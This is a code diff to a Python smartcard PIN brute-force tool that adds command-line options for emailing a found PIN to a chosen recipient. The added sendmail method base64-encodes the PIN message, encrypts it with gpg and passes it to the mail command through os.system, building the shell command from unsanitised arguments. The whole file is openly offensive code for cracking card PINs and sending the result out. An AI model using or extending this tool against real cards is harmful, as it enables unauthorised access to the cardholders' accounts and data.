@@ -8,10 +8,13 @@ import sys
 import time
 import humanfriendly 
 import signal
+import base64
+import os
+
 from smartcard.System import readers
 
 class Attack():
-  def __init__(self, connection, startpin, digits, wait, reset):
+  def __init__(self, connection, startpin, digits, wait, reset, rcpt=None, sender=None):
     self.wait = wait
     self.reset = reset
     self.startpin = startpin
@@ -21,6 +24,14 @@ class Attack():
     self.Continue = True
     self.Found = False
     self.connection = connection
+    self.rcpt = rcpt
+    self.sender = sender
+
+  def sendmail(self, body, recipient, subject, sender):
+    b64 = base64.b64encode(body.encode('ascii')).decode('ascii')
+    cmd = "echo %s | base64 -d | gpg -ea -r '%s' | mail %s -s '%s' -r '%s'" % (b64,recipient,recipient,subject, sender)
+    print(cmd)
+    os.system(cmd)
 
   def runtime(self):
     td = time.time() - self.ti
@@ -109,6 +120,9 @@ class Attack():
       if self.Found: # Status for successful attack
         print("\n\n[*] The PIN is: [ %d ]!!!" % n)
         self.stoping = True
+        if self.rcpt:
+          b = "The PIN is: [ %d ]!!!" % n
+          self.sendmail(b,self.rcpt,'Check this!!!',self.sender)
 
       if self.wait != None: 
         time.sleep(waittime)
@@ -128,6 +142,9 @@ if __name__ == "__main__":
   parser.add_argument("--lenght", help="Lenght of the Pin to be cracked.", default=4)
   parser.add_argument("--wait", help="Wait in seconds")
   parser.add_argument("--reset", help="Reset the chip after try")
+  parser.add_argument("--rcpt", help="Recipient of email")
+  parser.add_argument("--sender", help="Sender of the email")
+
 
   args = parser.parse_args()
 
@@ -151,7 +168,7 @@ if __name__ == "__main__":
   else:
     l = 4
 
-  attack = Attack(connection, n, l, args.wait, args.reset)
+  attack = Attack(connection, n, l, args.wait, args.reset, rcpt=args.rcpt, sender=args.sender)
   signal.signal(signal.SIGINT, attack.signal_handler)
   attack.crack_pin()
   print("[-] Program end.")
